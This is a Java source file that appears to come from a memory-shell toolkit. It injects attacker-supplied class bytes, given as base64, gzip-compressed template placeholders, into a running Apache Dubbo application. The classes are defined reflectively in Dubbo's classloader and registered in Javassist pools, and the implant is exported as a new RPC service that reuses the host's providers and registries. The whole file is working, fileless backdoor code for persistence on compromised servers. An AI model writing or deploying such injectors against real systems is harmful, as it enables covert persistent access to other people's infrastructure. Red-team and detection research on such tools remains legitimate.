package com.reajason.javaweb.memshell.injector.dubbo;

import javassist.ClassPool;
import org.apache.dubbo.common.bytecode.ClassGenerator;
import org.apache.dubbo.config.*;
import org.apache.dubbo.rpc.model.ApplicationModel;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.security.ProtectionDomain;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;
import java.util.zip.GZIPInputStream;

public class ApacheDubboServiceInjector {
    private final Map<String, ServiceConfig<?>> DYNAMIC_SERVICES = new ConcurrentHashMap<>();
    private static final String DISPLAY_HOST = "x.x.x.x";
    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getHelperBase64String() {
        return "{{helperBase64String}}";
    }

    public ApacheDubboServiceInjector() {
        if (ok) {
            return;
        }
        try {
            msg += registerService();
        } catch (Throwable e) {
            msg += "unexcepted error: " + getErrorMessage(e);
        }
        ok = true;
        System.out.println(msg);
    }

    private Class<?> loadClass(String payload) throws Exception {
        ClassLoader classLoader = resolveDubboClassLoader();
        byte[] classBytes = gzipDecompress(decodeBase64(payload));
        definePackageIfNeeded(classLoader, getClassName());
        Class<?> loadedClass = defineClass(classLoader, classBytes);
        registerInJavassistClassPool(classLoader, loadedClass.getName(), classBytes);
        msg += "[" + classLoader.getClass().getName() + "] ";
        return loadedClass;
    }

    private ClassLoader resolveDubboClassLoader() {
        ClassLoader classLoader = invokeDubboClassLoader("org.apache.dubbo.common.utils.ClassHelper");
        if (classLoader != null) {
            return classLoader;
        }
        classLoader = invokeDubboClassLoader("org.apache.dubbo.common.utils.ClassUtils");
        if (classLoader != null) {
            return classLoader;
        }
        classLoader = ClassGenerator.class.getClassLoader();
        return classLoader != null ? classLoader : Thread.currentThread().getContextClassLoader();
    }

    private ClassLoader invokeDubboClassLoader(String className) {
        try {
            Class<?> helperClass = Class.forName(className);
            return (ClassLoader) helperClass.getMethod("getClassLoader", Class.class).invoke(null, ClassGenerator.class);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private Class<?> defineClass(ClassLoader classLoader, byte[] classBytes) throws Exception {
        ProtectionDomain protectionDomain = ClassGenerator.class.getProtectionDomain();
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class,
                ProtectionDomain.class
        );
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(classLoader, null, classBytes, 0, classBytes.length, protectionDomain);
    }

    private void definePackageIfNeeded(ClassLoader classLoader, String className) {
        int packageEnd = className.lastIndexOf('.');
        if (packageEnd < 0) {
            return;
        }
        String packageName = className.substring(0, packageEnd);
        try {
            Method getPackage = ClassLoader.class.getDeclaredMethod("getPackage", String.class);
            getPackage.setAccessible(true);
            if (getPackage.invoke(classLoader, packageName) != null) {
                return;
            }
            Method definePackage = ClassLoader.class.getDeclaredMethod(
                    "definePackage",
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    java.net.URL.class
            );
            definePackage.setAccessible(true);
            definePackage.invoke(classLoader, packageName, null, null, null, null, null, null, null);
        } catch (Exception ignored) {
        }
    }

    public String toString() {
        return msg;
    }

    private void registerInJavassistClassPool(ClassLoader classLoader, String className, byte[] classBytes) {
        try {
            ClassPool classPool = ClassGenerator.getClassPool(classLoader);
            try {
                classPool.getClass().getMethod("makeClassIfNew", InputStream.class).invoke(classPool, new ByteArrayInputStream(classBytes));
            } catch (NoSuchMethodException e) {
                classPool.getClass().getMethod("makeClass", InputStream.class).invoke(classPool, new ByteArrayInputStream(classBytes));
            }
        } catch (Throwable ignored) {
        }
        insertByteArrayClassPath(className, classLoader, classBytes);
    }

    private void insertByteArrayClassPath(String className, ClassLoader classLoader, byte[] classBytes) {
        try {
            Class<?> classPoolClass = Class.forName("javassist.ClassPool");
            Class<?> classPathClass = Class.forName("javassist.ClassPath");
            Class<?> byteArrayClassPathClass = Class.forName("javassist.ByteArrayClassPath");
            insertClassPath(classPoolClass.getMethod("getDefault").invoke(null), classPoolClass, classPathClass, byteArrayClassPathClass, className, classBytes);
            insertClassPath(ClassGenerator.getClassPool(classLoader), classPoolClass, classPathClass, byteArrayClassPathClass, className, classBytes);
        } catch (Throwable ignored) {
        }
    }

    private void insertClassPath(Object classPool, Class<?> classPoolClass, Class<?> classPathClass, Class<?> byteArrayClassPathClass, String className, byte[] classBytes) throws Exception {
        if (classPoolClass.getMethod("find", String.class).invoke(classPool, className) == null) {
            classPoolClass.getMethod("insertClassPath", classPathClass).invoke(classPool, byteArrayClassPathClass.getConstructor(String.class, byte[].class).newInstance(className, classBytes));
        }
    }

    public static byte[] decodeBase64(String str) throws Exception {
        return Base64.getDecoder().decode(str);
    }

    public static byte[] gzipDecompress(byte[] bArr) throws IOException {
        try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
             GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(bArr))) {
            byte[] bArr2 = new byte[4096];
            int i;
            while ((i = gZIPInputStream.read(bArr2)) > 0) {
                byteArrayOutputStream.write(bArr2, 0, i);
            }
            return byteArrayOutputStream.toByteArray();
        }
    }

    public String registerService() throws Exception {
        String strNormalizePath = normalizePath(getUrlPattern());
        if (strNormalizePath.isEmpty()) {
            throw new IllegalArgumentException("path must not be empty");
        }
        if (!DYNAMIC_SERVICES.containsKey(strNormalizePath) && !isPathRegisteredInFramework(strNormalizePath)) {
            Class<?> shell = loadClass(getHelperBase64String());
            Class<?> shell2 = loadClass(getBase64String());
            validateServiceTypes(shell, shell2);
            ServiceConfig<?> serviceConfigCreateServiceConfig = createServiceConfig(strNormalizePath, shell, instantiate(shell2));
            if (DYNAMIC_SERVICES.putIfAbsent(strNormalizePath, serviceConfigCreateServiceConfig) != null) {
                return resolveServiceAddresses(strNormalizePath);
            }
            try {
                serviceConfigCreateServiceConfig.export();
                return resolveServiceAddresses(strNormalizePath);
            } catch (RuntimeException e) {
                DYNAMIC_SERVICES.remove(strNormalizePath, serviceConfigCreateServiceConfig);
                throw e;
            }
        }
        return resolveServiceAddresses(strNormalizePath);
    }

    private boolean isPathRegisteredInFramework(String str) {
        try {
            for (Object obj : getRegisteredServices()) {
                if (str.equals(obj.getClass().getMethod("getPath").invoke(obj))) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private Collection<?> getRegisteredServices() {
        try {
            Object configManager = resolveConfigManager();
            return toList(invokeNoArgs(configManager, "getServices"));
        } catch (Exception e) {
            try {
                Object objInvoke = ApplicationModel.class.getMethod("defaultModel").invoke(null);
                Object objInvoke2 = objInvoke.getClass().getMethod("getDefaultModule").invoke(objInvoke);
                Object objInvoke3 = objInvoke2.getClass().getMethod("getConfigManager").invoke(objInvoke2);
                return toList(invokeNoArgs(objInvoke3, "getServices"));
            } catch (Exception e2) {
                return new ArrayList<>();
            }
        }
    }

    private String normalizePath(String str) {
        if (str == null) {
            return "";
        }
        String strTrim = str.trim();
        while (true) {
            String str2 = strTrim;
            if (!str2.startsWith("/")) {
                return str2;
            }
            strTrim = str2.substring(1);
        }
    }

    private void validateServiceTypes(Class<?> cls, Class<?> cls2) {
        if (!cls.isInterface()) {
            throw new IllegalArgumentException("not an interface: " + cls.getName());
        }
        if (cls2.isInterface() || Modifier.isAbstract(cls2.getModifiers())) {
            throw new IllegalArgumentException("implementation class is not instantiable: " + cls2.getName());
        }
        if (!cls.isAssignableFrom(cls2)) {
            throw new IllegalArgumentException(cls2.getName() + " does not implement " + cls.getName());
        }
    }

    private Object instantiate(Class<?> cls) {
        try {
            Constructor<?> declaredConstructor = cls.getDeclaredConstructor();
            declaredConstructor.setAccessible(true);
            return declaredConstructor.newInstance();
        } catch (Exception e) {
            throw new IllegalArgumentException("failed to instantiate " + cls.getName(), e);
        }
    }

    private ServiceConfig<Object> createServiceConfig(String str, Class<?> cls, Object obj) {
        Object configManager = resolveConfigManager();
        ProviderConfig providerConfigResolveDefaultProvider = resolveDefaultProvider(configManager);
        ProviderConfig providerConfigSanitizeProviderConfig = sanitizeProviderConfig(providerConfigResolveDefaultProvider);
        ServiceConfig<Object> serviceConfig = new ServiceConfig<>();
        serviceConfig.setInterface(cls);
        serviceConfig.setRef(obj);
        serviceConfig.setPath(str);
        serviceConfig.setProxy("jdk");
        if (providerConfigSanitizeProviderConfig != null) {
            serviceConfig.setProvider(providerConfigSanitizeProviderConfig);
        }
        ApplicationConfig applicationConfig = castApplicationConfig(extractOptionalValue(invokeNoArgs(configManager, "getApplication")));
        if (applicationConfig != null) {
            serviceConfig.setApplication(applicationConfig);
        }
        String strResolveConfiguredVersion = resolveConfiguredVersion(providerConfigResolveDefaultProvider);
        if (strResolveConfiguredVersion != null) {
            serviceConfig.setVersion(strResolveConfiguredVersion);
        }
        serviceConfig.setProtocols(resolveConfiguredProtocols(providerConfigResolveDefaultProvider, configManager));
        serviceConfig.setRegistries(resolveRegistriesForExport(castRegistries(toList(invokeNoArgs(configManager, "getDefaultRegistries"))), castRegistries(toList(invokeNoArgs(configManager, "getRegistries")))));
        return serviceConfig;
    }

    private ProviderConfig resolveDefaultProvider(Object obj) {
        ProviderConfig providerConfigCastProviderConfig = castProviderConfig(extractOptionalValue(invokeNoArgs(obj, "getDefaultProvider")));
        if (providerConfigCastProviderConfig != null) {
            return providerConfigCastProviderConfig;
        }
        Object objInvokeNoArgs = invokeNoArgs(obj, "getDefaultModule");
        if (objInvokeNoArgs == null) {
            objInvokeNoArgs = invokeNoArgs(invokeStaticNoArgs(ApplicationModel.class, "defaultModel"), "getDefaultModule");
        }
        Object objInvokeNoArgs2 = invokeNoArgs(objInvokeNoArgs, "getConfigManager");
        ProviderConfig providerConfigCastProviderConfig2 = castProviderConfig(extractOptionalValue(invokeNoArgs(objInvokeNoArgs2, "getDefaultProvider")));
        return providerConfigCastProviderConfig2 != null ? providerConfigCastProviderConfig2 : castProviderConfig(firstElement(toList(invokeNoArgs(objInvokeNoArgs2, "getProviders"))));
    }

    private ProviderConfig sanitizeProviderConfig(ProviderConfig providerConfig) {
        if (providerConfig == null) {
            return null;
        }
        List registries = providerConfig.getRegistries();
        if (registries == null || filterValidRegistries(registries).size() == registries.size()) {
            return providerConfig;
        }
        return null;
    }

    private List<RegistryConfig> filterValidRegistries(Collection<RegistryConfig> collection) {
        if (collection == null) {
            return new ArrayList<>();
        }
        return collection.stream()
                .filter(registryConfig -> registryConfig != null && registryConfig.isValid())
                .collect(Collectors.toList());
    }

    private List<RegistryConfig> resolveRegistriesForExport(Collection<RegistryConfig> collection, Collection<RegistryConfig> collection2) {
        List<RegistryConfig> listFilterValidRegistries = filterValidRegistries(collection);
        if (!listFilterValidRegistries.isEmpty()) {
            return listFilterValidRegistries;
        }
        List<RegistryConfig> listFilterValidRegistries2 = filterValidRegistries(collection2);
        return !listFilterValidRegistries2.isEmpty() ? listFilterValidRegistries2 : Collections.singletonList(new RegistryConfig("N/A"));
    }

    private String resolveConfiguredVersion(Object obj) {
        return stringValue(invokeNoArgs(obj, "getVersion"), null);
    }

    private List<ProtocolConfig> resolveConfiguredProtocols(ProviderConfig providerConfig, Object configManager) {
        return resolveConfiguredProtocols(providerConfig, configManager, getRegisteredServices());
    }

    private List<ProtocolConfig> resolveConfiguredProtocols(ProviderConfig providerConfig, Object configManager, Collection<?> collection) {
        return mergeProtocols(mergeProtocols(mergeProtocols(providerConfig == null ? null : providerConfig.getProtocols(), castProtocols(toList(invokeNoArgs(configManager, "getDefaultProtocols")))), castProtocols(toList(invokeNoArgs(configManager, "getProtocols")))), collectProtocolsFromServices(collection));
    }

    private List<ProtocolConfig> collectProtocolsFromServices(Collection<?> collection) {
        List<ProtocolConfig> arrayList = new ArrayList<>();
        if (collection != null) {
            try {
                for (Object service : collection) {
                    try {
                        arrayList.addAll(castProtocols(toList(invokeNoArgs(service, "getProtocols"))));
                    } catch (Exception e) {
                    }
                }
            } catch (Exception e2) {
            }
        }
        try {
            for (Object exportedProvider : getExportedProviders()) {
                try {
                    Object objInvokeNoArgs = invokeNoArgs(exportedProvider, "getServiceConfig");
                    if (objInvokeNoArgs != null) {
                        arrayList.addAll(castProtocols(toList(invokeNoArgs(objInvokeNoArgs, "getProtocols"))));
                    }
                } catch (Exception e3) {
                }
            }
        } catch (Exception e4) {
        }
        return arrayList;
    }

    private Collection<?> getExportedProviders() {
        try {
            Object objInvoke = ApplicationModel.class.getMethod("getServiceRepository").invoke(null);
            return (Collection) objInvoke.getClass().getMethod("getExportedServices").invoke(objInvoke);
        } catch (Exception e) {
            try {
                Object objInvoke2 = ApplicationModel.class.getMethod("defaultModel").invoke(null);
                Object objInvoke3 = objInvoke2.getClass().getMethod("getDefaultModule").invoke(objInvoke2);
                Object objInvoke4 = objInvoke3.getClass().getMethod("getServiceRepository").invoke(objInvoke3);
                return (Collection) objInvoke4.getClass().getMethod("getExportedServices").invoke(objInvoke4);
            } catch (Exception e2) {
                return new ArrayList<>();
            }
        }
    }

    private String resolveServiceAddresses(String str) {
        String strNormalizePath = normalizePath(str);
        Object objFindRegisteredService = DYNAMIC_SERVICES.get(strNormalizePath);
        if (objFindRegisteredService == null) {
            objFindRegisteredService = findRegisteredService(strNormalizePath);
        }
        if (objFindRegisteredService == null) {
            return strNormalizePath;
        }
        List<?> listExtractExportedUrls = extractExportedUrls(objFindRegisteredService);
        if (!listExtractExportedUrls.isEmpty()) {
            return formatUrls(listExtractExportedUrls);
        }
        List<?> listResolveProtocols = resolveProtocols(objFindRegisteredService);
        if (listResolveProtocols.isEmpty()) {
            return strNormalizePath;
        }
        return formatProtocolAddresses(listResolveProtocols, strNormalizePath);
    }

    private Object findRegisteredService(String str) {
        for (Object obj : getRegisteredServices()) {
            if (str.equals(normalizePath(stringValue(invokeNoArgs(obj, "getPath"), "")))) {
                return obj;
            }
        }
        return null;
    }

    private List<?> extractExportedUrls(Object obj) {
        List<?> list = toList(invokeNoArgs(obj, "getExportedUrls"));
        if (!list.isEmpty()) {
            return list;
        }
        List<?> list2 = toList(getFieldValue(obj, "exporters"));
        if (list2.isEmpty()) {
            return new ArrayList<>();
        }
        List<Object> arrayList = new ArrayList<>();
        for (Object exporter : list2) {
            Object objInvokeNoArgs = invokeNoArgs(invokeNoArgs(exporter, "getInvoker"), "getUrl");
            if (objInvokeNoArgs != null) {
                arrayList.add(objInvokeNoArgs);
            }
        }
        return arrayList;
    }

    private List<?> resolveProtocols(Object obj) {
        List<?> list = toList(invokeNoArgs(obj, "getProtocols"));
        Object objInvokeNoArgs = invokeNoArgs(obj, "getProvider");
        List<ProtocolConfig> listResolveConfiguredProtocols = resolveConfiguredProtocols(objInvokeNoArgs instanceof ProviderConfig ? (ProviderConfig) objInvokeNoArgs : null, resolveConfigManager());
        return list.isEmpty() ? listResolveConfiguredProtocols : mergeProtocols(castProtocols(list), listResolveConfiguredProtocols);
    }

    private Object invokeNoArgs(Object obj, String str) {
        if (obj == null) {
            return null;
        }
        try {
            return obj.getClass().getMethod(str).invoke(obj);
        } catch (Exception e) {
            return null;
        }
    }

    private Object invokeStaticNoArgs(Class<?> cls, String str) {
        try {
            return cls.getMethod(str).invoke(null);
        } catch (Exception e) {
            return null;
        }
    }

    private Object getFieldValue(Object obj, String str) {
        if (obj == null) {
            return null;
        }
        Class<?> superclass = obj.getClass();
        while (true) {
            Class<?> cls = superclass;
            if (cls == null) {
                return null;
            }
            try {
                Field declaredField = cls.getDeclaredField(str);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                superclass = cls.getSuperclass();
            }
        }
    }

    private List<?> toList(Object obj) {
        Object value = extractOptionalValue(obj);
        if (value instanceof Collection) {
            return new ArrayList<>((Collection<?>) value);
        }
        if (value instanceof Map) {
            return new ArrayList<>(((Map<?, ?>) value).values());
        }
        return new ArrayList<>();
    }

    private Object extractOptionalValue(Object obj) {
        if (obj instanceof Optional) {
            return ((Optional<?>) obj).orElse(null);
        }
        return obj;
    }

    private Object firstElement(List<?> list) {
        if (list.isEmpty()) {
            return null;
        }
        return list.get(0);
    }

    private ProviderConfig castProviderConfig(Object obj) {
        if (obj instanceof ProviderConfig) {
            return (ProviderConfig) obj;
        }
        return null;
    }

    private ApplicationConfig castApplicationConfig(Object obj) {
        if (obj instanceof ApplicationConfig) {
            return (ApplicationConfig) obj;
        }
        return null;
    }

    private List<RegistryConfig> castRegistries(List<?> list) {
        return list.stream()
                .filter(RegistryConfig.class::isInstance)
                .map(RegistryConfig.class::cast)
                .collect(Collectors.toList());
    }

    private Object resolveConfigManager() {
        Object objInvokeStaticNoArgs = invokeStaticNoArgs(ApplicationModel.class, "getConfigManager");
        if (objInvokeStaticNoArgs != null) {
            return objInvokeStaticNoArgs;
        }
        Object objInvokeStaticNoArgs2 = invokeStaticNoArgs(ApplicationModel.class, "defaultModel");
        Object objInvokeNoArgs = invokeNoArgs(objInvokeStaticNoArgs2, "getDefaultModule");
        return invokeNoArgs(objInvokeNoArgs, "getConfigManager");
    }

    private String formatUrls(List<?> list) {
        return list.stream()
                .map(this::formatUrl)
                .collect(Collectors.joining(", "));
    }

    private String formatProtocolAddresses(List<?> list, String str) {
        return list.stream()
                .map(obj -> formatProtocolAddress(obj, str))
                .collect(Collectors.joining(", "));
    }

    private String formatUrl(Object obj) {
        String strStringValue = stringValue(invokeNoArgs(obj, "getProtocol"), "dubbo");
        String strNormalizePath = normalizePath(stringValue(invokeNoArgs(obj, "getPath"), ""));
        Integer numIntegerValue = integerValue(invokeNoArgs(obj, "getPort"));
        return (numIntegerValue == null || numIntegerValue.intValue() <= 0) ? String.format("%s://%s/%s", strStringValue, DISPLAY_HOST, strNormalizePath) : String.format("%s://%s:%d/%s", strStringValue, DISPLAY_HOST, numIntegerValue, strNormalizePath);
    }

    private String formatProtocolAddress(Object obj, String str) {
        String strStringValue = stringValue(invokeNoArgs(obj, "getName"), "dubbo");
        Integer numIntegerValue = integerValue(invokeNoArgs(obj, "getPort"));
        return (numIntegerValue == null || numIntegerValue.intValue() <= 0) ? String.format("%s://%s/%s", strStringValue, DISPLAY_HOST, str) : String.format("%s://%s:%d/%s", strStringValue, DISPLAY_HOST, numIntegerValue, str);
    }

    private String stringValue(Object obj, String str) {
        return (!(obj instanceof String) || ((String) obj).isEmpty()) ? str : (String) obj;
    }

    private Integer integerValue(Object obj) {
        if (obj instanceof Number) {
            return Integer.valueOf(((Number) obj).intValue());
        }
        return null;
    }

    private List<ProtocolConfig> castProtocols(List<?> list) {
        return list.stream()
                .filter(ProtocolConfig.class::isInstance)
                .map(ProtocolConfig.class::cast)
                .collect(Collectors.toList());
    }

    private List<ProtocolConfig> mergeProtocols(Collection<ProtocolConfig> collection, Collection<ProtocolConfig> collection2) {
        LinkedHashMap<String, ProtocolConfig> linkedHashMap = new LinkedHashMap<>();
        addProtocols(linkedHashMap, collection);
        addProtocols(linkedHashMap, collection2);
        return new ArrayList<>(linkedHashMap.values());
    }

    private void addProtocols(Map<String, ProtocolConfig> map, Collection<ProtocolConfig> collection) {
        if (collection == null) {
            return;
        }
        for (ProtocolConfig protocolConfig : collection) {
            if (protocolConfig != null) {
                map.put(protocolKey(protocolConfig), protocolConfig);
            }
        }
    }

    private String protocolKey(ProtocolConfig protocolConfig) {
        return String.valueOf(protocolConfig.getName()) + "|" + String.valueOf(protocolConfig.getHost()) + "|" + String.valueOf(protocolConfig.getPort()) + "|" + String.valueOf(protocolConfig.getServer()) + "|" + String.valueOf(protocolConfig.getId());
    }

    private String getErrorMessage(Throwable th) {
        try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
             PrintStream printStream = new PrintStream(byteArrayOutputStream)) {
            th.printStackTrace(printStream);
            return byteArrayOutputStream.toString();
        } catch (IOException e) {
            return String.valueOf(th);
        }
    }
}
